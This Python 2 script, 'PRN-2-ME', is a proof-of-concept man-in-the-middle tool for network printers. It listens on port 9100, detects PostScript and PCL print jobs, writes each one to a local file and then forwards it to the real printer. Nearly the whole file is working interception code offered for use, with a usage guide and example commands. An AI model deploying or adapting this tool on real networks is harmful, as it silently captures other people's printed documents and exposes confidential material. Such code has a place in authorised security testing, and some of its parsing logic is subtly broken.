#!/usr/bin/env python

# PRN-2-ME
#
# Chris John Riley
# blog.c22.cc
# contact [AT] c22 [DOT] cc
# 16/10/2010
#
# {Based on the proxyfuzz script from Rodrigo Marcos - http://www.theartoffuzzing.com}
# {Fuzzing elements removed}
#
# Changelog
# 0.1 --> Initial version

version = 0.01

from twisted.protocols import portforward
from twisted.internet.protocol import DatagramProtocol
from twisted.internet import reactor
import getopt, sys, re

def usage():

	print '''

	[ ] PRN-2-ME (PoC Printer MITM Script)

	This script is designed to extract PS/PCL prints by creating a listener on a port of the users choice 
	(default 9100) and saving them to a file before sending on the printjob to the IP address of the real printer.

	Usage .:

		-l Port for the script to listen on (default: 9100)
		-r IP-Address to redirct the print job to after saving to a file
		-p Destination port to use when forwarding on print jobs (default: 9100)
		
	Example .:
	
		./prn2me.py -r 10.0.0.10
		./prn2me.py -l 9101 -r 10.0.0.11 -p 9101'''

def logo():
	
	print '''

     _  _  _  _    _  _  _  _     _           _                      _  _  _                      _           _  _  _  _  _  _    
    (_)(_)(_)(_)_ (_)(_)(_)(_) _ (_) _       (_)                  _ (_)(_)(_) _                  (_) _     _ (_)(_)(_)(_)(_)(_)   
    (_)        (_)(_)         (_)(_)(_)_     (_)                 (_)         (_)                 (_)(_)   (_)(_)(_)               
    (_) _  _  _(_)(_) _  _  _ (_)(_)  (_)_   (_)  _  _  _  _  _            _ (_)  _  _  _  _  _  (_) (_)_(_) (_)(_) _  _          
    (_)(_)(_)(_)  (_)(_)(_)(_)   (_)    (_)_ (_) (_)(_)(_)(_)(_)        _ (_)    (_)(_)(_)(_)(_) (_)   (_)   (_)(_)(_)(_)         
    (_)           (_)   (_) _    (_)      (_)(_)                     _ (_)                       (_)         (_)(_)               
    (_)           (_)      (_) _ (_)         (_)                  _ (_) _  _  _                  (_)         (_)(_) _  _  _  _    
    (_)           (_)         (_)(_)         (_)                 (_)(_)(_)(_)(_)                 (_)         (_)(_)(_)(_)(_)(_)   
    
 	  +-++-++-+ +-++-++-++-+ +-++-++-++-++-++-+ +-++-++-+ +-++-++-++-++-++-++-+ +-++-+ +-++-+      - Chris John Riley -
	  |A||l||l| |Y||o||u||r| |P||r||i||n||t||s| |a||r||e| |B||e||l||o||n||g||s| |t||o| |U||s|      - blog.c22.cc      -
 	  +-++-++-+ +-++-++-++-+ +-++-++-++-++-++-+ +-++-++-+ +-++-++-++-++-++-++-+ +-++-+ +-++-+      - v.%s           -
 	  
 	  ''' % version



def process_dataReceived(self, data):
	global verbose
	global PCLactive
	global PSactive
	global data_tmp
	global savedjobs

	filename = 'job_'+str('%03d' % savedjobs)+'_'
	
	# Only trigger on new files
		
	if PSactive == 0 and PCLactive == 0:
		if data.startswith("\033E\033") or \
			((data[:6].find("\01b\045\01b") != -1)): # PCL Job Start
			if ((data[:6].find("\01b\045\01b") != -1)): print 'WOOOOOOOOOO\n\n\n'
			PCLactive = 1
			print '\n	[!] PCL Job Starting',
			data_tmp=[]
			data_tmp.append(data)
			return
	
		elif data.startswith("%!") or \
			data.startswith("\004%!") or \
			data.startswith("\033%-12345X%!PS") or \
			((data[:128].find("\033%-12345X") != -1) and \
			((data.find("LANGUAGE=POSTSCRIPT") != -1) or \
			(data.find("LANGUAGE = POSTSCRIPT") != -1) or \
			(data.find("LANGUAGE = Postscript") != -1))) : # PS Job Start (not checked)
		
			PSactive = 1
			print '\n	[!] Postscript Job Starting',
			data_tmp=[]
			data_tmp.append(data)
			return
		
	# Trigger on EOF or continue data append	
		
	if PCLactive == 1 or PSactive == 1: # Check for ongoing printjob
		data_tmp.append(data)
		
		if PSactive == 1 and re.search(r'%%EOF' , data) : # Postscript Job End
			PSactive = 0
			
			title_place = data_tmp[0].find('Title:') # Search for filename in data if present
			if title_place != '':
				title = data_tmp[0][title_place+7:title_place+87] # Select title after the word Title: / Max 80 chars
			else:
				title = '(NoName)'
			
			filename_extract = []
			
			for x in title:
				if re.match(r'.', x): 
					filename_extract.append(x)
				else: break
			
			filename_extract = filename_extract[1:-1] # Remove brackets
			
			filename_extract = "".join(filename_extract)
			
			filename = filename + filename_extract + '.ps'
			print ' --> Saving Postscript print job to ' + filename

			FILE = open(filename,"w")
			FILE.writelines(data_tmp)
			savedjobs = savedjobs + 1
			FILE.close()
		
		if PCLactive == 1 and data.endswith('\033E') : # PCL Job End
			PCLactive = 0
			filename = filename+'PCL.pcl'
			print ' --> Saving PCL print job to ' + filename
			FILE = open(filename,"w")
			FILE.writelines(data_tmp)
			savedjobs = savedjobs + 1
			FILE.close()
		
	else: print '\n	[!] Data Type Not recognized - Skipping Output'


def server_dataReceived(self, data):
	global verbose
	global request
	
	process_dataReceived(self, data)
			
	portforward.Proxy.dataReceived(self, data)

portforward.ProxyServer.dataReceived = server_dataReceived

def client_dataReceived(self, data):
	global verbose
	global notuntil
	global request

	if verbose:
		print '\n	[v] Server ------> Client'
		print '\n	[v] %r' % data
	
	portforward.Proxy.dataReceived(self, data)

portforward.ProxyClient.dataReceived = client_dataReceived

def starttcpproxy():
	reactor.listenTCP(localport, portforward.ProxyFactory(desthost, destport))
	print '\n	[*] Starting PRN Proxy on %i, forwarding all prints to %s:%s' % (localport, desthost, destport)
	reactor.run()
	

verbose = False

save = True

request = 0
localport = 0
desthost = ""
destport = 0
savedjobs = 0
PSactive = 0
PCLactive = 0
data_tmp = []

def main():
	global verbose
	global localport
	global desthost
	global destport
	
	try:
		opts, args = getopt.getopt(sys.argv[1:], "vhl:r:p:w:", ["help"])
	except getopt.GetoptError:
		sys.exit(2)
	try:
		for o, a in opts:
			if o in ("-h", "--help"):
				logo()
				usage()
				sys.exit()
			if o == "-l":
				localport=int(a)
			if o == "-r":
				desthost=a
			if o == "-p":
				destport=int(a)
			if o == "-v":
				verbose = True
			if o == "-w":
				notuntil=int(a)
		
		if localport == 0:
			localport = 9100 # Set Default port if unset
		if destport == 0:
			destport = 9100 # Set Default port if unset
				
				
	except:
		sys.exit(2)
		
	if desthost=="":
		logo()
		usage()
		sys.exit(2)
	else:
		logo()
		starttcpproxy()


if __name__ == "__main__":
    main()
